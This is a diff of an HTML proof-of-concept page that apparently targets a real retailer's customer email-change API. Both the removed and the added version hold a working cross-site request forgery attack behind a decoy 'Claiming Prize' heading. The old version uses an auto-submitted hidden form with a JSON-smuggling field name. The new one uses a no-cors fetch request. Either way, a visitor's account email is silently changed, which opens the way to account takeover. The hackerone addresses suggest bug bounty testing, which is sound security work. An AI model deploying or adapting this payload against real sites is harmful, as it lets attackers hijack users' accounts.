@@ -2,15 +2,18 @@
 <html>
 
 <body>
-    <h1>Claiming Voucher...</h1>
-
-    <form id="csrf-form" action="https://www.boozt.com/eu/en/api/customer/profile/email/change" method="POST"
-        enctype="text/plain">
-        <input type="hidden" name='{"email":"absolutexon+pwned@wearehackerone.com", "ignore_me":"' value='"}' />
-    </form>
-
+    <h1>Claiming Prize...</h1>
     <script>
-        document.getElementById('csrf-form').submit();
+        // This sends the request EXACTLY like Burp Repeater
+        // No trailing '=' sign, no extra parameters.
+        fetch("https://www.boozt.com/eu/en/api/customer/profile/email/change", {
+            method: "POST",
+            mode: "no-cors", // This is the magic switch that allows cross-origin POST
+            headers: {
+                "Content-Type": "text/plain"
+            },
+            body: '{"email":"absolutexon+fetchattack@wearehackerone.com"}'
+        });
     </script>
 </body>
 
